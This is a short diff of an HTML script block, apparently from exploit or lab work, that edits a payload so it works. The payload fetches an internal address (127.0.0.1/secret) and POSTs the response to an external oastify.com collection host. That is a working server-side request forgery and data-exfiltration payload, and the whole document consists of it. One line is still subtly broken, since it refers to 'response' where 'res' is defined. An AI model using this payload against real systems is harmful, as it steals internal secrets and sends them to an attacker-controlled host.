@@ -2,9 +2,10 @@
   <script>
 fetch("http://127.0.0.1/secret")
   .then(res => response.text())
+    .then(data => {
       fetch("https://fwfzn6pmtfl01fay5hc6bjsplgr7fx3m.oastify.com", {
         method: "POST",
-        body: res
+        body: data
       })
     })
   </script>
